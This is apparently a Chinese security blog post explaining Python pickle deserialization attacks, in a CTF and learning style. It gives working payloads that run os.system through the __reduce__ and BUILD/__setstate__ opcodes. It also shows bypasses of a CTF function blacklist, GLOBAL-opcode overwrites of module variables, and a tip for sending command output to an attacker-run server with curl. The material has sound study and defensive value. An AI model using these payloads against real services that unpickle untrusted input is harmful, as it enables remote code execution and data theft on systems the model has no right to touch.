<p>正常的字符串反序列化后，得到一个 <code>Student</code>  对象。我们想构造一个字符串，它在反序列化的时候，执行 <code>dir</code>  指令。那么我们只需要这样得到 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickletools</span><br><span class="line">import pickle</span><br><span class="line">class Student():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.name = &#x27;sb&#x27;</span><br><span class="line">        self.grade = &#x27;zz&#x27;</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (os.system,(&#x27;dir&#x27;,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Student())</span><br><span class="line">payload = pickletools.optimize(payload)</span><br><span class="line"></span><br><span class="line">print(payload)</span><br><span class="line">pickletools.dis(payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03cnt\nsystem\nX\x03\x00\x00\x00dir\x85R.&#x27;</span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;nt system&#x27;</span><br><span class="line">   13: X    BINUNICODE &#x27;dir&#x27;</span><br><span class="line">   21: \x85 TUPLE1</span><br><span class="line">   22: R    REDUCE</span><br><span class="line">   23: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
<p>现在把 payload 拿给正常的程序（Student 类里面没有 <code>__reduce__</code> 方法）去解析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickletools</span><br><span class="line">import pickle</span><br><span class="line">class Student():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.name = &#x27;sb&#x27;</span><br><span class="line">        self.grade = &#x27;zz&#x27;</span><br><span class="line"></span><br><span class="line">res = pickle.loads(b&#x27;\x80\x03cnt\nsystem\nX\x03\x00\x00\x00dir\x85R.&#x27;)</span><br></pre></td></tr></table></figure>
<p>即使 Student 类是正常的，pickle.loads 仍然执行了 os.system (‘dir’)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\18310\AppData\Local\Programs\Python\Python37\python.exe C:/Users/18310/Desktop/serial.py</span><br><span class="line"> ������ C �еľ��� Windows-SSD</span><br><span class="line"> ������к��� 4FEC-7D0B</span><br><span class="line"></span><br><span class="line"> C:\Users\18310\Desktop\sec֪ʶ��\Ӧ����Ӧ\py_pickel ��Ŀ¼</span><br><span class="line"></span><br><span class="line">2022/11/24  11:45    &lt;DIR&gt;          .</span><br><span class="line">2022/11/24  11:45    &lt;DIR&gt;          ..</span><br><span class="line">2022/11/24  11:44    &lt;DIR&gt;          .idea</span><br><span class="line">2021/10/07  14:22            16,958 6.png</span><br><span class="line">2022/08/17  21:43             2,938 aaaa.gif</span><br><span class="line">2022/08/17  21:53    &lt;DIR&gt;          build</span><br></pre></td></tr></table></figure>
<p>只要在序列化中的字符串中存在 <code>R</code>  指令， <code>__reduce__</code> 方法就会被执行，无论正常程序中是否写明了 <code>__reduce__</code></p>
<p>由于 <code>__reduce__</code> 方法对应的操作码是 <code>R</code> ，只需要<strong>把操作码 <code>R</code>  过滤掉</strong>就行了。这个可以很方便地利用 <code>pickletools.genops</code>  来实现。</p>
<p><strong>绕过黑名单</strong></p>
<p>有一种过滤方式：不禁止 <code>R</code>  指令码，但是对 <code>R</code>  执行的函数有黑名单限制。典型的例子是 2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</span><br></pre></td></tr></table></figure>
<p>可惜 <code>platform.popen()</code>  不在名单里，它可以做到类似 <code>system</code>  的功能。这题死于黑名单有漏网之鱼。</p>
<p>还有一个解，那就是利用 map</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Exploit(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line"> 	return map,(os.system,[&quot;ls&quot;])</span><br></pre></td></tr></table></figure>
<h3 id="全局变量包含覆盖c指令码"><a class="markdownIt-Anchor" href="#全局变量包含覆盖c指令码">#</a> 全局变量包含覆盖： <code>c</code>  指令码</h3>
<p><code>c</code>  指令码可以用来调用全局的 <code>xxx.xxx</code>  的值</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">flag</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,a,b</span>):</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line"><span class="comment"># new_flag = pickle.dumps(flag(&#x27;A&#x27;,&#x27;B&#x27;),protocol=3)</span></span><br><span class="line"><span class="comment"># print(new_flag)</span></span><br><span class="line"><span class="comment"># pickletools.dis(new_flag)</span></span><br><span class="line"></span><br><span class="line">your_payload = <span class="string">b&#x27;?&#x27;</span></span><br><span class="line">other_flag = pickle.loads(your_payload)</span><br><span class="line">secret_flag = flag(secret.a,secret.b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> other_flag.a == secret_flag.a <span class="keyword">and</span> other_flag.b == secret_flag.b:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;flag&#123;xxxxxx&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># secret.py</span></span><br><span class="line"><span class="comment"># you can not see this</span></span><br><span class="line">a = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;bbbb&#x27;</span></span><br></pre></td></tr></table></figure>
<p>现在的任务是：给出一个字符串，<strong>反序列化之后，a 和 b 需要与 secret 这个 module 里面的 a、b 相对应</strong>。</p>
<p>在我们不知道 <code>secret.py</code>  中值的情况下，如何构造满足条件的 payload，拿到 flag</p>
<p>不能用 <code>R</code>  指令码了， <code>c</code>  指令码专门用来获取一个全局变量。</p>
<p>我们先弄一个正常的 Student 来看看序列化之后的效果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickletools</span><br><span class="line">import pickle</span><br><span class="line">class Student():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.name = &#x27;sb&#x27;</span><br><span class="line">        self.grade = &#x27;zz&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#     def __reduce__(self):</span><br><span class="line">#         return (os.system,(&#x27;dir&#x27;,))</span><br><span class="line">#</span><br><span class="line">payload = pickle.dumps(Student())</span><br><span class="line">print(payload)</span><br><span class="line">print(&quot;--------------&quot;)</span><br><span class="line">payload = pickletools.optimize(payload)</span><br><span class="line">print(payload)</span><br><span class="line">print(&quot;--------------&quot;)</span><br><span class="line">pickletools.dis(payload)</span><br><span class="line">print(&quot;--------------&quot;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nStudent\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00nameq\x03X\x02\x00\x00\x00sbq\x04X\x05\x00\x00\x00gradeq\x05X\x02\x00\x00\x00zzq\x06ub.&#x27;</span><br><span class="line">--------------</span><br><span class="line">b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x02\x00\x00\x00sbX\x05\x00\x00\x00gradeX\x02\x00\x00\x00zzub.&#x27;</span><br><span class="line">--------------</span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;__main__ Student&#x27;</span><br><span class="line">   20: )    EMPTY_TUPLE</span><br><span class="line">   21: \x81 NEWOBJ</span><br><span class="line">   22: &#125;    EMPTY_DICT</span><br><span class="line">   23: (    MARK</span><br><span class="line">   24: X        BINUNICODE &#x27;name&#x27;</span><br><span class="line">   33: X        BINUNICODE &#x27;sb&#x27;</span><br><span class="line">   40: X        BINUNICODE &#x27;grade&#x27;</span><br><span class="line">   50: X        BINUNICODE &#x27;zz&#x27;</span><br><span class="line">   57: u        SETITEMS   (MARK at 23)</span><br><span class="line">   58: b    BUILD</span><br><span class="line">   59: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>
<p>注意看 33 和 50 行的变量值，以 name 的为例，只需要把硬编码的 <code>sb</code>  改成从 <code>secret</code>  引入的 <code>name</code> ，写成指令就是： <code>csecret\nname\n</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> 0: \x80 PROTO      3</span><br><span class="line"> 2: c    GLOBAL     &#x27;__main__ Student&#x27;</span><br><span class="line">20: )    EMPTY_TUPLE</span><br><span class="line">21: \x81 NEWOBJ</span><br><span class="line">22: &#125;    EMPTY_DICT</span><br><span class="line">23: (    MARK</span><br><span class="line">24: X        BINUNICODE &#x27;name&#x27;</span><br><span class="line">33: c        GLOBAL 	   &#x27;secret name&#x27;</span><br><span class="line">40: X        BINUNICODE &#x27;grade&#x27;</span><br><span class="line">50: c        GLOBAL 	   &#x27;secret grade&#x27;</span><br><span class="line">57: u        SETITEMS   (MARK at 23)</span><br><span class="line">58: b    BUILD</span><br><span class="line">59: .    STOP</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原来的：b&#x27;\x80\x03c__main__\nflag\nq\x00)\x81q\x01&#125;q\x02(X\x01\x00\x00\x00aq\x03X\x01\x00\x00\x00Aq\x04X\x01\x00\x00\x00bq\x05X\x01\x00\x00\x00Bq\x06ub.&#x27;</span><br><span class="line">现在的：</span><br><span class="line">b&#x27;\x80\x03c__main__\nflag\nq\x00)\x81q\x01&#125;q\x02(X\x01\x00\x00\x00aq\x03csecret\na\nq\x04X\x01\x00\x00\x00bq\x05csecret\nb\nq\x06ub.&#x27;</span><br></pre></td></tr></table></figure>
<p>或者再举个例子</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-b42656fa4b3c95eaee8c37dccacad636_720w.webp" alt="img"></p>
<p>现在的任务是：给出一个字符串，<strong>反序列化之后，name 和 grade 需要与 blue 这个 module 里面的 name、grade 相对应</strong>。</p>
<p>正常的 student 类序列化之后的效果：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8b0cb8c071dadcde37abdce434a8f180_720w.webp" alt="img"></p>
<p>以 name 的为例，只需要把硬编码的 <code>rxz</code>  改成从 <code>blue</code>  引入的 <code>name</code> ，写成指令就是： <code>cblue\nname\n</code> 。把用于编码 <code>rxz</code>  的 <code>X\x03\x00\x00\x00rxz</code>  替换成我们的这个 global 指令</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-2a5604887f01ef88aebf6409279e82a1_720w.webp" alt="img"></p>
<p>顺带一提，由于 pickle 导出的字符串里面有很多的不可见字符，所以一般都经过 base64 编码之后传输。</p>
<p>如果你也不能手搓 opcode，看看这两个链接？</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMy43L0xpYi9waWNrbGUucHk=">cpython/pickle.py at 3.7 · python/cpython (github.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9hbmFwaWNrbGUvYmxvYi9tYXN0ZXIvYW5hcGlja2xlLnB5">anapickle/anapickle.py at master · sensepost/anapickle (github.com)</span></p>
<p>绕过黑名单</p>
<p>之前提到过， <code>c</code>  指令（也就是 GLOBAL 指令）基于 <code>find_class</code>  这个方法， 然而 <code>find_class</code>  可以被出题人重写。如果出题人只允许 <code>c</code>  指令包含 <code>__main__</code> 这一个 module，这道题又该如何解决呢</p>
<p>通过 GLOBAL 指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！</p>
<ul>
<li>通过 <code>__main__.blue</code>  引入这一个 module，由于命名空间还在 main 内，故不会被拦截</li>
<li>把一个 dict 压进栈，内容是 <code>&#123;'name': 'rua', 'grade': 'www'&#125;</code></li>
<li>执行 BUILD 指令，会导致改写  <code>__main__.blue.name</code>  和  <code>__main__.blue.grade</code>  ，至此 <code>blue.name</code>  和 <code>blue.grade</code>  已经被篡改成我们想要的内容</li>
<li>弹掉栈顶，现在栈变成空的</li>
<li>照抄正常的 Student 序列化之后的字符串，压入一个正常的 Student 对象，name 和 grade 分别是’rua’和’www’</li>
</ul>
<p>由于栈顶是正常的 Student 对象，pickle.loads 将会正常返回。到手的 Student 对象，<span class="exturl" data-url="aHR0cDovL3huLS1uYW1lZ3JhZGVibHVlLTQ1MHVqOTZlZW4zYmR0MWQ5c3hnLm5hbWU=">当然 name 和 grade 都与 blue.name</span>、blue.grade 对应了 —— 我们刚刚亲手把 blue 篡改掉。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-be0b611551c62614ea92f06ffe234480_r.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;\x80\x03c__main__\nblue\n&#125;(Vname\nVrua\nVgrade\nVwww\nub0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import blue</span><br><span class="line">def check(data):</span><br><span class="line">    if b&#x27;R&#x27; in data:</span><br><span class="line">        return &#x27;no reduce!&#x27;</span><br><span class="line">    x = pickle.loads(data)</span><br><span class="line">    </span><br><span class="line">    if (x != Student(blue.name, blue.grade)):</span><br><span class="line">        return &#x27;not equal&#x27;</span><br><span class="line">    return f&#x27;well done now blue.grade=&#123;blue.grade&#125;&#x27;</span><br><span class="line"></span><br><span class="line">print(check(base64.b64decode(input())))</span><br></pre></td></tr></table></figure>
<h3 id="使用build指令rce"><a class="markdownIt-Anchor" href="#使用build指令rce">#</a> 使用 build 指令 rce</h3>
<p><code>__reduce__</code> 与 <code>R</code>  指令是绑定的，禁止了 <code>R</code>  指令就禁止了 <code>__reduce__</code>  方法。那么，在禁止 <code>R</code>  指令的情况下，我们还能 RCE 吗？</p>
<p>现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用 <code>fun(arg)</code> ，其中 <code>fun</code>  和 <code>arg</code>  都必须可控。</p>
<p>审 pickle 源码，来看看 BUILD 指令（指令码为 <code>b</code> ）是如何工作的：</p>
<p>这里的实现方式也就是上文的注所提到的：如果 <code>inst</code>  拥有 <code>__setstate__</code> 方法，则把 <code>state</code>  交给 <code>__setstate__</code> 方法来处理；否则的话，直接把 <code>state</code>  这个 <code>dist</code>  的内容，合并到 <code>inst.__dict__ </code> 里面。</p>
<p>通过 BUILD 指令与 C 指令的结合，我们可以把改写为 <code>os.system</code>  或其他函数</p>
<p><code>Student</code>  原先是没有 <code>__setstate__</code> 这个方法的。那么我们利用 <code>&#123;'__setstate__': os.system&#125;</code>  来 BUILD 这个对象，那么现在对象的 <code>__setstate__</code> 就变成了 <code>os.system</code> ；接下来利用 <code>&quot;ls /&quot;</code>  来再次 BUILD 这个对象，则会执行 <code>setstate(&quot;ls /&quot;)</code>  ，而此时 <code>__setstate__</code> 已经被我们设置为 <code>os.system</code> ，因此实现了 RCE.</p>
<p>payload 构造如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb.&#x27;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-5f6f6661a916b296e3fac6fbed8427cc_720w.webp" alt="img"></p>
<p>有一个可以改进的地方：这份 payload 由于没有返回一个 Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常 Student 进栈。payload 构造如下：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStu</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-fd188e8d3e3f341d719019b7e869bf9d_720w.webp" alt="img"></p>
<p>具体构造 payload 的方法：</p>
<p>假设我们有一个 flag 类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import pickletools</span><br><span class="line"></span><br><span class="line">class flag():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line">new_flag = pickle.dumps(flag(),protocol=3)</span><br><span class="line">print(new_flag)</span><br><span class="line">pickletools.dis(new_flag)</span><br><span class="line"></span><br><span class="line"># your_payload = b&#x27;?&#x27;</span><br><span class="line"># other_flag = pickle.loads(your_payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nflag\nq\x00)\x81q\x01.&#x27;</span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;__main__ flag&#x27;</span><br><span class="line">   17: q    BINPUT     0</span><br><span class="line">   19: )    EMPTY_TUPLE</span><br><span class="line">   20: \x81 NEWOBJ</span><br><span class="line">   21: q    BINPUT     1</span><br><span class="line">   23: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
<p>根据 BUILD 的说明，我们需要构造一个字典</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nflag\nq\x00)\x81&#125;.&#x27;</span><br></pre></td></tr></table></figure>
<p>接下来往字典里放值，先放一个 mark</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nflag\nq\x00)\x81&#125;(.&#x27;</span><br></pre></td></tr></table></figure>
<p>放键值对</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nflag\nq\x00)\x81&#125;(V__setstate__\ncos\nsystem\nu.&#x27;</span><br></pre></td></tr></table></figure>
<p>第一次 BUILD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nflag\nq\x00)\x81&#125;(V__setstate__\ncos\nsystem\nub.&#x27;</span><br></pre></td></tr></table></figure>
<p>放参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nflag\nq\x00)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\n.&#x27;</span><br></pre></td></tr></table></figure>
<p>第二次 BUILD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nflag\nq\x00)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\nb.&#x27;</span><br></pre></td></tr></table></figure>
<p>完成</p>
<p>一些补充的细节</p>
<blockquote>
<p><strong>一</strong>、** 其他模块的 load 也可以触发 pickle 反序列化漏洞。** 例如： <code>numpy.load()</code>  先尝试以 numpy 自己的数据格式导入；如果失败，则尝试以 pickle 的格式导入。因此 <code>numpy.load()</code>  也可以触发 pickle 反序列化漏洞。</p>
<p>二、即使代码中没有 <code>import os</code> ，<strong>GLOBAL 指令也可以自动导入 <code>os.system</code> </strong>。因此，不能认为 “我不在代码里面导入 os 库，pickle 反序列化的时候就不能执行 os.system”。</p>
<p>三、** 即使没有回显，也可以很方便地调试恶意代码。** 只需要拥有一台公网服务器，执行 <code>os.system('curl your_server/</code> ls / | base64 <code>)</code> ，然后查询您自己的服务器日志，就能看到结果。这是因为：以 ``` 引号包含的代码，在 sh 中会直接执行，返回其结果。</p>
</blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI2NDM2My5odG1s">Python pickle 反序列化详解 - FreeBuf 网络安全行业门户</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC84OTEzMjc2OA==">从零开始 python 反序列化攻击：pickle 原理解析 &amp; 不用 reduce 的 RCE 姿势 - 知乎 (zhihu.com)</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9taXNha2lrYXRhLmdpdGh1Yi5pby8yMDIwLzA0L3B5dGhvbi0lRTUlOEYlOEQlRTUlQkElOEYlRTUlODglOTclRTUlOEMlOTYv">python 反序列化～Misaki’s Blog (misakikata.github.io)</span></p>

  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-11-26 21:46:42" itemprop="dateModified" datetime="2022-11-26T21:46:42+08:00">2022-11-26</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="John Doe Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="John Doe PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2022/08/16/Unserialize/" title="unserialize">http://example.com/2022/08/16/Unserialize/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2022/06/27/SSRF/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;img.timelessq.com&#x2F;images&#x2F;2022&#x2F;07&#x2F;26&#x2F;1eaf2713d4a30c9691c9eaf4f898e499.jpg" title="SSRF">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> web安全</span>
  <h3>SSRF</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;img.timelessq.com&#x2F;images&#x2F;2022&#x2F;07&#x2F;26&#x2F;263cec5f94b8b4f7e818b8b7103a1a84.jpg" title="秋招总结">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> 秋招</span>
  <h3>秋招总结</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
